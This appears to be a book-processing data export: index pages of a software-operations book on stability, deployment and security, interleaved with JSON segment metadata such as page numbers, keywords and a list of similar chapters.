Swarm, 149, 189, 212 dogpile antipattern, 78–80,\n\n211\n\ndomain name, fully qualified,\n\n143\n\ndomain objects\n\navoiding bad layering,\n\n303\n\nimmutable, 64 synchronizing methods\n\non, 64–66\n\ndowntime, fallacy of planned,\n\n242\n\ndrain period, 249 drift, 327 Drift into Failure, 327 dynamic generation problems in ecommerce case study, 287\n\nE EC2, 161 Edge, SameSite attribute, 228 efficiency, cautions, 300 EIA-232C, 111 EJB (Enterprise JavaBeans),\n\n18, 27\n\nelastic scaling, deployment\n\ntools, 208\n\nIndex • 344\n\nElasticsearch, 204 Elixir and actors, 108 embracing plurality, 321–322 encryption\n\nKey Management Service\n\n(KMS), 226, 233\n\npassword vaulting, 232 sensitive data, 226 enterprise application integra- tion, see decoupling middle- ware\n\nEnterprise JavaBeans (EJB),\n\n18, 27\n\nenterprise systems, DNS\n\nround-robin load balancing, 174\n\nenumeration, machine, 187 environments\n\nchaos engineering, 325 development environ-\n\nment, 199, 208\n\nper-environment configu-\n\nration, 161\n\nquality assurance (QA) environment, 199\n\ntest, 251 Equifax, 215, 229 Erlang and actors, 108 errors\n\ndefined, 28 logging, 166 etcd, 161, 188, 206 Ethereal, see Wireshark Ethernet and NICs, 143 Etsy, 239 event bus, persistent, 315 event journal, 315 event notification, 314 event ordering, 148 event sourcing, 315 event-based architecture, 304 event-carried state transfer,\n\n314 events\n\nevent-based architecture,\n\n304\n\nin information architec-\n\nture, 314–316\n\nordering, 148 as term, 314 The Evolution of Useful\n\nThings, 301\n\nevolutionary architecture,\n\n296, 302–313\n\nexceptions, logging, 166 excluding modular operator,\n\n310\n\nexecutables, defined, 156 explicit context, 306–307, 320 extinction, service, 296–298\n\nF Facebook, number of users,\n\n31 fail fast\n\nlatency problems, 94 slow responses, 86, 107 stability pattern, 106–108\n\nfailure, see also cascading\n\nfailures\n\nchain of failure, 28–30 defined, 29 isolation and splitting\n\nmodules, 309\n\nmodes, 26–28 modes and size, 32 stopping crack propaga-\n\ntion, 27–29\n\nfailure injection testing (FIT),\n\n332\n\nfailures, cascading, see cas-\n\ncading failures\n\nFamily Values: A Behavioral Notion of Subtyping, 65\n\nFarley, Dave, 295 fault density, 97 faults\n\ndefined, 28 fault density, 97 fault isolation with time-\n\nouts, 92\n\nfeature toggles, 210, 260 feedback\n\navoiding thrashing with,\n\n292\n\npainless releases, 295\n\nFight Club bugs, 71 filenames and directory traversal attacks, 224 Firefox, SameSite attribute,\n\n228 firewalls\n\napplication-layer, 227 blocking scrapers and\n\nspiders, 60\n\nbreaches and administra- tive access-only net- works, 145\n\ndefined, 40\n\nduration of connections,\n\n41\n\nsoftware-defined network-\n\ning, 187\n\nFIT (failure injection testing),\n\n332\n\nFIT tests, see contract tests force multiplier antipattern,\n\n80–84, 123, 194\n\nFord, Neal, 302 form follows failure, 301 foundation layer, 141–154 in layer diagram, 141 networking, 142–146 physical hosts, virtual\n\nmachines, and contain- ers, 146–153 Fowler, Martin, 314 FQDN (fully qualified domain\n\nname), 143\n\nframing, request, 264, 269 fully qualified domain name\n\n(FQDN), 143\n\nfunctional testing, test har-\n\nnesses, 45, 116\n\nG gaps\n\ngenerative testing for,\n\n266\n\ntesting gap in ecommerce\n\ncase study, 285\n\ngarbage collector\n\ncaching without memory\n\nlimits, 67\n\nweak references, 53–54,\n\n67 gateways\n\nAPI gateways, 227 default, 186 ecommerce case study,\n\n286\n\nenabling cookies, 286 generic, 93\n\nGeneral Principles of Systems\n\nDesign, 327\n\ngenerative testing, for gaps,\n\n266\n\ngeneric gateways, 93 global server load balancing\n\ndisaster recovery, 180 with DNS, 175–177 global state and implicit con-\n\ntext, 307\n\nIndex • 345\n\nglobalObjectCache, blocked\n\nthreads example, 64–66\n\nThe Goal, 300 GoCD, 243 Goetz, Brian, 62 governor stability pattern,\n\n123–125, 194, 296 Gregorian calendar, 129 GSLB, see global server load\n\nbalancing\n\nGUI interfaces, 131, 211 Gunther, Neil, 184\n\nH handshaking\n\nintegration point failures,\n\n46\n\nstability pattern, 111–113 TCP, 36, 111, 183 unbalanced capacities,\n\n76, 112 HAProxy, 179 headers, versioning with,\n\n264, 269 health checks\n\nchain reaction example,\n\n48\n\nwith Consul, 189 global server load balanc-\n\ning, 175\n\nguidelines, 169, 180 handshaking, 112 instances, 169, 180 load shedding, 184 report criteria, 258 rollouts, 258 VIP pool information, 178\n\nheap memory, traffic prob-\n\nlems, 52–54\n\nHeroku\n\n12-factor app, 151 environment variables,\n\n161 Hickey, Rich, 265 hijacking, session, 218–222 horizontal coupling, 302 horizontal scaling, see scaling hostnames\n\ndefined, 143 machine identity, 143–\n\n146, 152\n\nvirtual machines in the\n\ncloud, 152\n\nhosts\n\nconfiguration mapping,\n\n244\n\nDNS servers, 177 elastic scaling and deploy-\n\nment tools, 208\n\nin foundation layer, 146 virtual machines in the\n\ncloud, 152\n\nHTTP\n\nabout, 58 API agreements, 264 handshaking problems,\n\n111\n\nHTTP Strict Transport\n\nSecurity, 226\n\nintegration point failures,\n\n43\n\nlive control APIs, 210 specification, 264 versioning with, 264, 269\n\nhttpd, 179 Humble, Jez, 295 hysteresis, 84, see also gover-\n\nnor stability pattern\n\nI IaaS (infrastructure-as-a-ser-\n\nvice), 246\n\nidentifiers, services, 316–318 ignorance, principle of, 305 immutable infrastructure code guidelines, 158 deployment, 245 domain objects, 64 packaging, 245 rollout example, 258 steady state pattern, 101\n\nimplicit context, 306 impulse, defined, 24 inbound testing, 266 indexing, log, 204 information architecture and\n\nadaptation, 313–323 information leakage, 224 infrastructure, see immutable\n\ninfrastructure\n\ninfrastructure-as-a-service\n\n(IaaS), 246\n\ninjection vulnerabilities, 216–\n\n218\n\ninstallation\n\ndefined, 156 deployment and, 245\n\ninstances\n\nChaos Monkey, 331 code guidelines, 157–160 configuration guidelines,\n\n160–162 defined, 155 health checks, 169, 180 instances layer, 141,\n\n155–170\n\ninterconnection layer,\n\n171–191\n\nin layer diagram, 141 let it crash pattern, 109 live control and speed,\n\n209\n\nload balancing, 173–182 loose clustering, 305 metrics, 169 porting modules, 312 transparency guidelines, 162–170, 200–206 insufficient attack prevention,\n\n227\n\nintegration points\n\ncascading failures, 50 circuit breakers, 45–46,\n\n98\n\ndecoupling middleware,\n\n45–46, 117\n\nexpensive users, 56 fail fast pattern, 106 HTTP protocols, 43 live control, 210 metrics, 205 retailer example, 35 socket-based protocols,\n\n35–43\n\nstability antipatterns, 33–\n\n46, 94\n\nstrategies for, 45–46 vendor API libraries, 44\n\nintegration testing\n\nexplicit context, 307 overspecification, 272 test harnesses, 45, 113–\n\n117\n\nintelligence, cunning malevo-\n\nlent, 334\n\ninterconnection\n\ndemand control, 182–186 different solutions for dif-\n\nferent scales, 172\n\nDNS, 173–177 interconnection layer,\n\n141, 171–191\n\nin layer diagram, 141,\n\n171\n\nload balancing, 173–182\n\nIndex • 346\n\nmigratory virtual IP ad-\n\ndresses, 189\n\nnetwork routing, 186–188 service discovery with\n\nDNS, 172–173\n\nservice discovery with\n\ndiscovery services, 188\n\ninterfaces\n\nbonding, 144 enumeration problems,\n\n187\n\nmachine identity, 143–\n\n146, 153\n\nInternet Explorer, SameSite\n\nattribute, 228\n\nInternet of Things, security,\n\n61\n\nintrusion detection software,\n\n232\n\ninvalidating, cache, 67, 105 inversion modular operator,\n\n311\n\ninvestigations, see post-\n\nmortems\n\nInviting Disaster, 26, 32 IP addresses, see also virtual\n\nIP addresses\n\nblocking specific, 285,\n\n287\n\nbonding interfaces, 144 containers, 149–150 default gateways, 186 load balancing with DNS,\n\n173–177\n\noutbound connections,\n\n146\n\nresolving hostnames,\n\n143, 145\n\nvirtual LANs (VLANs),\n\n149–150, 187\n\nvirtual extensible LANs\n\n(VXLANs), 150\n\nvirtual machines in the\n\ncloud, 152\n\nisolation\n\ncontainers, 231 failure isolation and\n\nsplitting modules, 309 fault isolation with time-\n\nouts, 92\n\nlet it crash pattern, 108 test harnesses, 114 ivory tower architecture, 5\n\nJ Java\n\nactors, 108\n\nDNS round-robin load\n\nbalancing, 174\n\nJava Encoder Project,\n\n222\n\nmethod synchronization,\n\n65\n\nthread dumps, 16–18 Java Concurrency in Practice,\n\n62\n\nJava Encoder Project, 222 java.util.logging and thread\n\ndumps, 17 JDBC driver\n\nairline case study, 20 migratory virtual IP ad-\n\ndresses, 190 SQLException, 20 unbounded result sets,\n\n87 Jenkins, 243 Jones, Nora, 332 Julian calendar, 129 jumphost servers, 153 JVM, warm-up period, 209\n\nK Kafka, 315 Kerberos, 220–221 key encryption keys, 226, 233 Key Management Service\n\n(KMS), 226, 233\n\nKibana, 204 kill, Java thread dumps, 16 KMS (Key Management Ser-\n\nvice), 226, 233 Kua, Patrick, 302 Kubernetes, 149, 212\n\nL landing zones, self-denial at-\n\ntacks, 71\n\nlast responsible moment, 119 latency\n\ndata purging, 102 fail fast, 94 as lagging indicator, 134 Latency Monkey, 331 test harnesses, 116 timeouts, 94 Latency Monkey, 331 layer 7 firewalls, 227 layered architecture, 302–303 leader election, 206, 305 Leaky Bucket pattern, 97\n\nlean development and deci-\n\nsion loops, 291 Lean Enterprise, 300 Lean Software Development,\n\n300\n\nleast privilege principle, 231 least recently used (LRU) algo-\n\nrithms, 105\n\nlegal conditions, 60, 287 let it crash stability pattern,\n\n108–111\n\nLet’s Encrypt, 220 libraries\n\nblocked threads from,\n\n67, 69\n\ntimeouts, 92 vendor libraries and\n\nblocked threads, 67, 69 vendor libraries and inte- gration point failures, 44\n\nwrapping, 68 Lilius, Aloysius, 129 Linux\n\nnetwork interface names,\n\n144\n\nTIME_WAIT, 185\n\nLiskov substitution principle,\n\n65, 265\n\nlisten queues, 37, 75, 119,\n\n183–184\n\nLittle Bobby Tables attack,\n\n216\n\nLittle’s law, 120, 183 load, see also load balancers\n\ndeployment speed, 249 judging load capacity by concurrent users, 281 judging load capacity by\n\nsessions, 281 live control, 210 load shedding, 119–120,\n\n122, 184\n\nload testing, 26, 281–284\n\nload balancers, see al-\n\nso health checks; load\n\nabout, 46 blue/green deployments,\n\n295\n\nbulkheads, 100 canary deployments, 257 chain reactions, 46–49 containers, 150 with DNS, 173–177 fail fast pattern, 106 guidelines, 177–182\n\nIndex • 347\n\nhandshaking, 112 hardware, 180 partitioning request\n\ntypes, 181\n\nround-robin load balanc-\n\ning, 173–174\n\nself-denial attacks, 70 service discovery, 188 software, 178 virtual IP addresses,\n\n178, 189\n\nvirtual LANs (VLANs), 150 virtual machines in the\n\ncloud, 153\n\nload shedding, 119–120, 122,\n\n184\n\nload testing\n\ncosts, 26 crushed ecommerce site,\n\n281–284\n\nloan service example of\n\nbreaking API changes, 268– 271\n\nlock managers\n\nself-denial attacks, 70 virtual machines, 148\n\nlocking\n\noptimistic, 70 pessimistic, 70\n\nlog collectors, 204–206, 227 log indexing, 204 Log4j, 17 logging and log files\n\n12-factor app checklist,\n\n151\n\nadvantages, 165 bad requests, 227 circuit breakers, 97 compliance requirements,\n\n104\n\ndebug logs, 167 indexing logs, 204 levels of logging, 166 log collectors, 204–206,\n\n227\n\nlog file locations, 166 logging servers, 104–105 for postmortems, 16–18 readability, 167 rotating log files, 103–104 software load balancing,\n\n179\n\nsystem-wide transparen-\n\ncy, 204–206\n\ntest harness requests,\n\n116\n\ntransparency, 165–169,\n\n204–206\n\nlogrotate, 104 Logstash, 105, 204 longevity, 25 loose clustering, 305 LRU (least recently used) algo-\n\nrithms, 105\n\nM MAC addresses, virtual IP\n\naddresses, 189 machine identity\n\nenumeration, 187 networks, 143–146, 152 virtual machines in the\n\ncloud, 152\n\nMajors, Charity, 330 malicious users, instability\n\npatterns, 60–62\n\nmanual assignment, 244 mapping\n\nrole, 244, 246 session-specific, 223\n\nMars rover, 290 mechanical advantage, 194 Memcached, 54 memory\n\ncache limits, 67, 105 expunging passwords\n\nand keys, 233\n\nheap, 52–54 in-memory caching stabil-\n\nity problems, 105 leaks and chain reac-\n\ntions, 49\n\nleaks and improper\n\ncaching, 105\n\nleaks and slow responses,\n\n85\n\nloss during rollout, 259 migratory virtual IP ad-\n\ndresses, 190\n\noff-heap, 54 off-host, 54 serialization and session failover in ecommerce case study, 287\n\ntraffic problems, 52–54 weak references, 53–54,\n\n67 Mesos, 149, 212\n\nmessaging\n\ndecoupling middleware,\n\n117\n\nin information architec-\n\nture, 314–316\n\nlogging messages, 169 point-to-point communi- cation scaling effects, 73\n\npublish/subscribe mes-\n\nsaging, 73, 117\n\nsystem to system messag-\n\ning, 117\n\nmethods\n\nremote method invocation\n\n(RMI), 18, 27\n\nsynchronizing, 64–66 metric collectors, 204–206 metrics\n\naggregating, 204 blocked threads, 63 circuit breakers, 97 guidelines, 204 instance, 169 metric collectors, 204–\n\n206\n\nsystem-wide transparen-\n\ncy, 204–206 thresholds, 206\n\nmicrokernels, 303 microservices\n\nbulkheads, 101 cautions, 304 evolutionary architecture,\n\n303\n\nlet it crash pattern, 109 middleware, defined, 117, see also decoupling middleware migrations frameworks, 250,\n\n260\n\nmigratory virtual IP address-\n\nes, 189\n\nmixed workload, defined, 24 mock objects, 114 modeling tools for schema\n\nchanges, 260\n\nmodular operators, 308–313 modules\n\naugmenting, 310 excluding, 310 inverting, 311 porting, 312 splitting, 308 substituting, 310\n\nMongoDB hostage attack, 225\n\nIndex • 348\n\nmonitoring\n\nback pressure, 123 blocked threads, 63 cache hit rates, 67 chaos engineering, 330 containers, 149 coupling and transparen-\n\ncy, 164\n\nhuman pattern matching,\n\n131\n\nload levels, 184 load shedding, 120, 184 open-source services, 172 real-user monitoring,\n\n200–201\n\nresource contention, 184 role in platform, 197 slow responses, 85 supplementing with exter-\n\nnal, 63 multicasts, 73, 264 multihoming, 143–146 multiplier effect, 73, see al-\n\nso force multiplier antipat- tern\n\nmultithreading, see al- so threads, blocked\n\ncircuit breakers, 97 stability and, 62–69\n\nmutexes, timeouts, 92\n\nN Nakama, Heather, 329 names\n\nconfiguration properties,\n\n162\n\nfilenames and directory traversal attacks, 224\n\nfully qualified domain name (FQDN), 143 machine identity, 143–\n\n146, 152\n\nservice discovery with\n\nDNS, 173\n\nNAS, 147 NASA, 290 National Health Service, 215 native code, defined, 87 navel-gazing, 62 Netflix\n\nChaos Automation Plat-\n\nform (ChAP), 334 failure injection testing\n\n(FIT), 332 metrics, 169\n\nSimian Army, 328–335 Spinnaker, 243 Netscape, cookie develop-\n\nment, 58\n\nnetwork interface controllers,\n\nsee NICs\n\nnetworks\n\nas abstraction, 36 administrative access-\n\nonly, 145\n\ncontainer challenges, 149 enumeration problems,\n\n187\n\nfoundation layer, 142–\n\n146\n\nintegration points stabili- ty antipatterns, 33–46 interface names, 143–146 machine identity, 143–\n\n146, 152\n\noutbound connections,\n\n146\n\noverlay networks, 149 routing guidelines, 186–\n\n188\n\nslow responses from, 85 software-defined network-\n\ning, 187\n\nTCP basics, 36–38 test harnesses, 114–117 VPNs, 186 New Relic, 200 nginx, 179 NICs\n\ndefault gateways, 186 loopback, 143 machine identity, 143–\n\n146, 153\n\nqueue backups, 183\n\nnonlinear effect, 183 NTLM, 221 nut theft crisis, 215\n\nO OAuth, 221 observe, orient, decide, act\n\n(OODA) loop, 291\n\nOccupational Safety and\n\nHealth Administration (OS- HA), 83\n\nODBC driver, migratory virtu-\n\nal IP addresses, 190\n\noff-heap memory, 54 off-host memory, 54\n\n“On the Criteria to Be Used\n\nin Decomposing Systems”, 310\n\nOODA (observe, orient, de-\n\ncide, act) loop, 291\n\nOpen Web Application Securi- ty Project, see OWASP Top 10\n\nOpenJDK, warm-up period,\n\n209\n\nOpera, SameSite attribute,\n\n228\n\noperations\n\nfallacy of DevOps, 294 in layer diagram, 141 separation from develop-\n\nment in past, 292 operators, modular, 308–313 optimistic locking, 70 Oracle, see also JDBC driver\n\ndead connection detec-\n\ntion, 42\n\nODBC driver, 190\n\norchestration, 206 organization\n\nadaptation and, 290–301 efficiency cautions, 300 platform roles, 197–199 team, 4, 197–199, 292–\n\n294, 299\n\nteam-scale autonomy,\n\n298\n\nORMs, unbounded result\n\nsets, 88\n\nOSHA (Occupational Safety\n\nand Health Administration), 83\n\noutbound connections, 146 outbound integration, live\n\ncontrol, 210\n\noverlay network, 149 overrides, ecommerce case\n\nstudy, 281\n\nOWASP Top 10, 216–231\n\nAPIs, 230 broken access control,\n\n222–224\n\ncomponents with known vulnerabilities, 229 cross-site request forgery\n\n(CSRF), 228\n\ncross-site scripting (XSS),\n\n219, 221, 228 injection, 216–218\n\nIndex • 349\n\ninsufficient attack preven-\n\ntion, 227\n\nsecurity misconfigura-\n\ntion, 225\n\nsensitive data exposure,\n\n226\n\nsession hijacking, 218–\n\n222\n\nP PaaS\n\nassignment, 244 certificate management,\n\n220\n\ndiscovery services, 189 immutable infrastructure\n\nand, 246\n\nlet it crash pattern, 110 open-source tools, 172\n\npackaging\n\ndeployment, 245 package repository, 208\n\npackets\n\nback pressure, 121 packet capture, 38, 40 SYN/ACK packets, 37 pagination, unbounded result\n\nsets, 89 parameters\n\nchecking and fail fast\n\npattern, 107\n\nimplicit context, 307\n\nParnas, David, 310 parsing\n\nAPI security, 230 injection vulnerabilities,\n\n216–218 Parsons, Rebecca, 302 partitioning\n\nairline case study, 27 backup traffic, 145 with bulkheads, 47, 49,\n\n98–101\n\ndiscovery services, 188 request types with load\n\nbalancers, 181\n\nsplitting modular opera-\n\ntor, 308\n\nthreads inside a single\n\nprocess, 100\n\npasswords\n\nconfiguration files, 161 configured passwords,\n\n232\n\ndefault, 225 resources, 226 salt, 220, 226\n\nsecurity guidelines, 220,\n\n232\n\nstoring, 226 vaulting, 150, 232\n\npatch management tools and\n\ncontainers, 231\n\npattern detection, 167 Pattern Languages of Program\n\nDesign 2, 66, 97\n\npatterns, see stability antipat- terns; stability patterns Patterns of Enterprise Applica-\n\ntion Architecture, 92 PDQ analyzer toolkit, 184 performance\n\nqueue depth as indicator,\n\n202\n\nvirtual machines, 147\n\npessimistic locking, 70 Petroski, Henry, 301 photography example of fail\n\nfast, 107\n\npie crust defense, 220, 226,\n\n234\n\npilot-induced oscillation, 292 placement services, 209 platform\n\ncontrol plane, 197–199 costs, 202 goals, 293–294 platform services and\n\nneed for own platform team, 294\n\nplatform services guide-\n\nlines, 212–213\n\nroles, 197–199, 292–294,\n\n299\n\nteam-scale autonomy,\n\n299\n\nplatform-as-a-service,\n\nsee PaaS\n\nplugins\n\nevolutionary architecture,\n\n303\n\nsecurity, 158, 208, 229\n\nplurality, embracing, 321–322 point-to-point communication scaling effects, 72–73, 75\n\npolicy proxy, 317 porpoising, 292 porting modular operator,\n\n312\n\nports\n\n12-factor app checklist,\n\n151\n\nbinding, 151 containers, 149 test harnesses and port\n\nnumbers, 116 POST, versioning API changes, 269, 271\n\nPostel’s Robustness Principle,\n\n263, 265\n\nPostel, John, 263 postmortems\n\nairline case study, 14–20 Amazon Web Services S3 service outage, 195– 197\n\nBlack Friday case study,\n\n135\n\nlogging state transitions,\n\n169\n\nfor successful changes,\n\n196\n\ntasks, 195\n\npower-law distribution, 88,\n\n304\n\npragmatic architecture, 5 pre-autoscaling, 71 pressure, see back pressure price checkers, see competi-\n\ntive intelligence\n\nprimitives\n\nchecking for hangs, 64,\n\n69\n\nsafe, 64, 69 timeouts, 92\n\nprinciple of ignorance, 305 Principles of Product Develop-\n\nment Flow, 300\n\nprivilege principle, least, 231 PRNG (pseudorandom num-\n\nber generator), 219 process binding, 100 processes\n\n12-factor app checklist,\n\n151\n\nbinding, 100 circuit breaker scope, 97 code guidelines, 157–160 configuration guidelines,\n\n160–162 defined, 156 deployment diagram, 156 instances layer, 155–170 let it crash pattern, 109\n\nIndex • 350\n\npartitioning threads in-\n\nside, 100\n\nruntime diagram, 156 transparency guidelines,\n\n162–170\n\nproduction, designing for, see also deployment; stability\n\ncontrol plane layer, 141,\n\n193–214\n\ncosts, 3 foundation layer, 141–\n\n154\n\ninstances layer, 141,\n\n155–170\n\ninterconnection layer,\n\n141, 171–191\n\nlayer diagram, 141, 171 need for, 1–6 priorities, 141 security layer, 215–234\n\nproperties\n\nlisting changes for ecom- merce case study, 280\n\nnaming configuration,\n\n162\n\nprovisioning services, guide-\n\nlines, 207\n\npseudorandom number gener-\n\nator (PRNG), 219\n\npublish/subscribe messaging,\n\n73, 117 pull mode\n\ndeployment tools, 208 log collectors, 204 pulse and dogpiles, 80 push mode\n\ndeployment tools, 208 log collectors, 204\n\nPUT, versioning API changes,\n\n269\n\nQ quality assurance (QA)\n\ncrushed ecommerce site case study, 278–281\n\noverfocus on, 1 quality of environment,\n\n199\n\nunbounded result sets,\n\n88\n\nquery objects, 92 queues\n\nback pressure, 120–123 backups and system fail-\n\nures, 182\n\ncommand queue, 211\n\ndepth as indicator of per-\n\nformance, 202\n\nlisten queue purge, 185 listen queues, 37, 75,\n\n119, 183–184 load shedding, 120 point-to-point communi- cation scaling effects, 73\n\nretries, 94 TCP networking, 37 virtual machines in the\n\ncloud, 153\n\nquorum-based consensus,\n\n206\n\nR race conditions\n\ncascading failures, 50 Latency Monkey, 331 load balancers and chain\n\nreactions, 46–49\n\nransomware, 215 real-user monitoring (RUM),\n\n200–201\n\nrecovery\n\nchaos engineering, 330 comparing treatment op-\n\ntions, 137\n\ndisaster, 180, 335 hardware load balancing,\n\n180\n\nRecovery-Oriented Com-\n\nputing, 138\n\nrestoring service as prior-\n\nity, 12 targets, 12 timeouts, 94\n\nRecovery-Oriented Computing\n\n(ROC), 138\n\nReddit.com outage example,\n\n80–83, 123, 194, 196\n\nRedis, 54 redundancy, 98 references, weak, 53–54, 67 relational databases\n\ndeployment, 250–252,\n\n260\n\nimplicit context, 307 paradigm, 313\n\nremote method invocation\n\n(RMI), 18, 27\n\nreputation and poor stability,\n\n24\n\nrequest framing, 264, 269 residence time, 184\n\nresilience engineering, 326 resources\n\nauthorizing access to,\n\n223\n\nblocked threads, 64, 68 cascading failures, 50 data purging, 102, 107 fail fast pattern, 106 load shedding, 119, 184 metrics, 205 scaling effects of shared\n\nresources, 73\n\nshared-nothing architec-\n\nture, 70, 74\n\nslow responses, 86 steady state pattern,\n\n102–106 timeouts, 92 virtual machines, 147\n\nresources for this book book web page, xiv cross-site request forgery\n\n(CSRF), 229\n\ncross-site scripting (XSS),\n\n222\n\ndirectory traversal at-\n\ntacks, 224\n\ngeneral security, 234 injection, 217 passwords, 226\n\nresponses, slow, see slow re-\n\nsponses\n\nretailer examples\n\nBlack Friday case study,\n\n129–139, 163\n\nchain reaction example,\n\n48\n\ncrushed ecommerce site,\n\n277–288\n\nEtsy deployment, 239 integration point failure\n\nexample, 35\n\nretries\n\ncascading failures, 50 dogpiles, 80 listen queue purge, 185 migratory virtual IP ad-\n\ndresses, 190\n\nqueuing, 94 timeouts, 93\n\nrevenue and transparency,\n\n202\n\nreverse proxy servers, soft- ware load balancing, 178\n\nrisk cycle, 246 RMI (remote method invoca-\n\ntion, 18\n\nIndex • 351\n\nRMI (remote method invoca-\n\ntion), 27\n\nrobots, OSHA guidelines, 83,\n\nsee also shopbots\n\nrobots.txt file, 59 Robustness Principle, Pos-\n\ntel’s, 263, 265\n\nROC (Recovery-Oriented\n\nComputing), 138\n\nrole mapping, 244, 246 rolling deployments, speed,\n\n248\n\nrollout, deployment phase,\n\n257–259\n\nroot certificate authority files,\n\n230\n\nroot privileges, 231 round-robin load balancing,\n\n173–174\n\nrouting\n\ncontent-based, 181 guidelines, 186–188 software-defined network-\n\ning, 187\n\nstatic route definitions,\n\n187\n\nRS-232, 111 RUM (real-user monitoring),\n\n200–201\n\nruntime\n\ncosts, 202 diagram, 156\n\nRx frameworks, back pres-\n\nsure, 121\n\nS salt, 220, 226 SameSite attribute, 228 sample applications and secu-\n\nrity, 225\n\nSAN, 147 Sarbanes–Oxley Act of 2002,\n\n104\n\nScala and actors, 108 scaling, see also autoscaling chain reactions, 46 elastic scaling and deploy-\n\nment tools, 208\n\nhorizontal scaling, de-\n\nfined, 46\n\nmultiplier effect, 73 need for load balancing,\n\n177",
      "page_number": 343,
      "chapter_number": 42,
      "summary": "This chapter covers segment 42 (pages 343-353). Key topics include service, deployment, and deployments.",
      "keywords": [
        "global server load",
        "Key Management Service",
        "HTTP Strict Transport",
        "Amazon Machine Images",
        "airline case study",
        "ecommerce case study",
        "Black Friday case",
        "DNS round-robin load",
        "live control API",
        "integration point failures",
        "Common Weakness Enumer",
        "Command Query Respon",
        "discovery services DNS",
        "Amazon Web Services",
        "fail fast pattern"
      ],
      "concepts": [
        "service",
        "deployment",
        "deployments",
        "defined",
        "attacks",
        "pattern",
        "security",
        "failures",
        "logging",
        "log"
      ],
      "similar_chapters": [
        {
          "book": "Microservices Up and Running",
          "chapter": 31,
          "title": "Segment 31 (pages 305-313)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Microservices Development",
          "chapter": 35,
          "title": "Segment 35 (pages 296-303)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 37,
          "title": "Segment 37 (pages 378-388)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 3,
          "title": "Segment 3 (pages 17-24)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 43,
          "title": "Segment 43 (pages 367-374)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 43,
      "title": "Segment 43 (pages 354-361)",
      "start_page": 354,
      "end_page": 361,
      "detection_method": "topic_boundary",
      "content": "point-to-point communi- cation scaling effects, 75\n\nscaling effects and shared\n\nresources, 73\n\nscaling effects and trans-\n\nparency, 164\n\nscaling effects in point-to- point communication, 72–73\n\nscaling effects stability antipattern, 71–75 self-denial attacks, 70 unbalanced capacities,\n\n77\n\nvertical, 46\n\nschemaless databases, deploy-\n\nment, 252–255, 260\n\nscope, circuit breakers, 97 scrapers\n\nsession bloat from, 285,\n\n287\n\nstability problems, 59–60\n\nscript kiddies, 61 scripts, startup scripts and\n\nthread dumps, 17\n\nsearch engines, session bloat\n\nfrom, 284\n\nsecurity\n\nadministration, 225, 231 advanced persistent\n\nthreat, 60\n\nAPIs, 230 attack surfaces, 225 authentication, 218–222 blacklists, 227 broken access control,\n\n222–224\n\nbuilds, 157, 208 bulkheads, 230 certificate revocation list\n\n(CRL), 227\n\ncertificates, 219, 227,\n\n230\n\nchain of custody, 157 components with known vulnerabilities, 229 configuration, 161, 225 configured passwords,\n\n232\n\ncontainers, 225, 231 cookies, 58, 219 costs, 215 cross-site request forgery\n\n(CSRF), 228\n\ncross-site scripting (XSS),\n\n219, 221, 228\n\ndependencies, 158, 229 direct object access, 223 directory traversal at-\n\ntacks, 224\n\ndistributed denial-of-ser- vice (DDoS) attacks, 61\n\nHTTP Strict Transport\n\nSecurity, 226\n\ninformation leakage, 224 injection, 216–218 insufficient attack preven-\n\ntion, 227\n\nInternet of Things, 61 intrusion detection soft-\n\nware, 232\n\nleast privilege principle,\n\n231\n\nlogging bad requests, 227 malicious users, 60–62 misconfiguration, 225 as ongoing process, 233 OWASP Top 10, 216–231 pie crust defense, 220,\n\n226, 234\n\nplugins, 158, 208, 229 ransomware, 215 resources on, 222, 224,\n\n226, 229, 234\n\nsample applications, 225 script kiddies, 61 security layer, 215–234 sensitive data exposure,\n\n226\n\nsession fixation, 218 session hijacking, 218–\n\n222\n\nsession prediction attack,\n\n219\n\nURL dualism, 321 self-contained systems, 303 self-denial attacks, 69–71, 76 sensitive data exposure, 226 serialization and session\n\nfailover in ecommerce case study, 287\n\nservice discovery, see discov-\n\nery services\n\nservice extinction, 296–298 service-oriented architecture\n\nand bulkheads, 101\n\nservices\n\ncontrol of identifiers,\n\n316–318 defined, 155\n\nIndex • 352\n\nservice extinction, 296–\n\n298\n\nservice-oriented architec-\n\nture, 101\n\nsession IDs\n\ncross-site scripting (XSS),\n\n219, 221, 228 generating, 219 self-denial attacks, 71 session hijacking, 218–\n\n222\n\nsession prediction attack,\n\n219\n\nsession affinity, 255 session failover\n\necommerce case study\n\nand serialization, 287 shared-nothing architec-\n\nture, 74 session fixation, 218 session prediction attack, 219 sessions, see also cookies as abstraction, 58 bloat from scrapers and\n\nspiders, 285, 287\n\ncaching, 58 cross-site scripting (XSS),\n\n219, 221, 228\n\ndeployment time-frame,\n\n249\n\ndistributed denial-of-ser- vice (DDoS) attacks, 61\n\nheap memory, 52–54 judging load capacity by\n\ncounting, 281\n\nmemory loss during roll-\n\nout, 259\n\noff-heap memory, 54 replication in crushed ecommerce site case study, 284–288 session affinity, 255 session fixation, 218 session hijacking, 218–\n\n222\n\nsession prediction attack,\n\n219\n\nsession-sensitive URLs,\n\n223\n\nsession-specific mapping,\n\n223\n\nshared-nothing architec-\n\nture, 74\n\nstickiness, 181, 258 throttling, 286 unwanted user problems,\n\n57–60\n\nSHA-1, 226 shared-nothing architecture,\n\n70, 74\n\nshed load stability pattern,\n\n119–120, 122, 184 Shermer, Michael, 167 shims, 250, 259 shopbots, 59–61, 285, 287 signal for confirmation, 84 Simian Army, 328–335 Single System of Record, 321 slow responses\n\ncircuit breakers, 98 fail fast pattern, 107 handshaking, 112 as indistinguishable from crashes, 63–64, 84\n\nload shedding, 120 stability antipattern, 84,\n\n89\n\ntest harnesses, 116 timeouts, 94 unbounded result sets,\n\n89\n\nsocial media, growth in users,\n\n31, 88 sockets\n\nas abstraction, 36, 40 back pressure, 121 closed, 55 integration point failures,\n\n35–43\n\nnumber of connectors, 54 test harnesses, 116 traffic failures, 54\n\nsoft references, see weak ref-\n\nerences\n\nsoftware crisis, 31 software-defined 